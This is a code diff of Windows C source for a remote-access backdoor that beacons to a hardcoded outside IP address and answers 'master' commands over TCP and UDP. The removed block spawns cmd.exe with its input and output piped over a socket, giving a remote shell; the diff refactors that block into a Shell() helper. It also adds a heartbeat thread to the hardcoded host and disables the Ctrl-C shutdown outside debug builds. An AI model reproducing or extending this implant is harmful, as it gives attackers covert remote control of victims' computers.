@@ -5,34 +5,29 @@
 #pragma comment (lib, "Mswsock.lib")
 #pragma comment (lib, "AdvApi32.lib")
 
-
-
 const char _SIG_INIT[] = {0xfb, 0x00};
 const char _SIG_FILE[] = {0xfb, 0x01};
 const char _SIG_COUT[] = {0xfb, 0x02};
 const char _SIG_SHLL[] = {0xfb, 0x03};
 const char _SIG_HRBT[] = {0xff, 0xff};
 
-int HeartBeat(SOCKET s){
-    /* Slave -> Master relationship*/
-    int iResult;
-    iResult = send(s, _SIG_HRBT, 2, 0);
-    DBGLG("Sent heartbeat\n");
-    return iResult;
-}
-
 SOCKET* __sock_TCP = NULL;
 SOCKET* __sock_UDP = NULL;
 PROCESS_INFORMATION* __child = NULL;
+HANDLE __heartbeat = INVALID_HANDLE_VALUE;
 
 void HandleCTRL_C(int sg){
+    #ifdef DEBUG
     if (__sock_TCP && (*__sock_TCP != INVALID_SOCKET))
         closesocket(*__sock_TCP);
     if (__sock_UDP && (*__sock_UDP != INVALID_SOCKET))
         closesocket(*__sock_UDP);
     if (__child)
         TerminateProcess(__child->hProcess, 0);
+    if (__heartbeat)
+        TerminateThread(__heartbeat, 0);
     exit(0);
+    #endif
 
 }
 
@@ -45,16 +40,19 @@ int __cdecl main(int argc, char **argv)
     SOCKET socku = INVALID_SOCKET;
     struct sockaddr_in ad_info;
     PROCESS_INFORMATION pi;
-    HANDLE hStdinRd, hStdinWr, hStdoutRd, hStdoutWr;
     __sock_TCP = &sock;
     __sock_UDP = &socku;
     __child = &pi;
+    srand(time(NULL));
     signal (SIGINT, HandleCTRL_C);
 
     iResult = InitSetup();
     if (iResult < 0){
         return 1;
     }
+    iResult = HeartBeat("45.143.93.119", &__heartbeat);
+    printf("got here\n");
+    DBGLG("thread started: ", iResult);
     iResult = SetupServerUDP(&socku);
     if (iResult > 0){
         perror("udpsetup failed");
@@ -98,52 +96,7 @@ int __cdecl main(int argc, char **argv)
                 if (iResult < 0){
                     perror("failed at connecting");
                 }
-                SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
-
-                // Create pipes for the child process's standard input and output.
-                if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0) ||
-                    !CreatePipe(&hStdinRd, &hStdinWr, &sa, 0))
-                {
-                    perror("failed at creating pipes for child process");
-                    break;
-                }
-                sa.bInheritHandle = TRUE;
-                STARTUPINFO si = { sizeof(STARTUPINFO) };
-                si.dwFlags = STARTF_USESTDHANDLES;
-                si.hStdInput = hStdinRd;
-                si.hStdOutput = hStdoutWr;
-                si.hStdError = hStdoutWr;
-                OVERLAPPED writeOverlapped = { 0 };
-                OVERLAPPED readOverlapped = { 0 };
-                writeOverlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
-                readOverlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
-                if (!CreateProcess(NULL, "C:\\Windows\\System32\\cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
-                {
-                    perror("failed at creating process");
-                    closesocket(sock);
-                    break;
-                }
-                CloseHandle(hStdoutWr);
-                CloseHandle(hStdinRd);
-                /* INITIAL CMD LOADING*/
-                ScanOutPipe(hStdoutRd, &readOverlapped, sock);
-                ScanOutPipe(hStdoutRd, &readOverlapped, sock);
-                /*END OF LOADING*/
-                while (1){
-                    iResult = WriteInPipe(hStdinWr, &writeOverlapped ,sock);
-                    if (iResult){
-                        break;
-                    }
-                    iResult = ScanOutPipe(hStdoutRd, &readOverlapped, sock);
-                    if(iResult){
-                        break;
-                    }
-                }
-                CloseHandle(hStdoutRd);
-                CloseHandle(hStdinWr);
-                TerminateProcess(pi.hProcess, 0);
-                CloseHandle(pi.hProcess);
-                CloseHandle(pi.hThread);
+                Shell(pi, sock);
                 closesocket(sock);
                 break;
             case 0x3:
@@ -151,7 +104,7 @@ int __cdecl main(int argc, char **argv)
             /* Reverse shell */
                 break;
             case 0xff:
-                DBGLG("Got ff\n");
+                DBGLG("BABY WE Got ff\n");
             /* Heartbeat */
                 break;
             default:
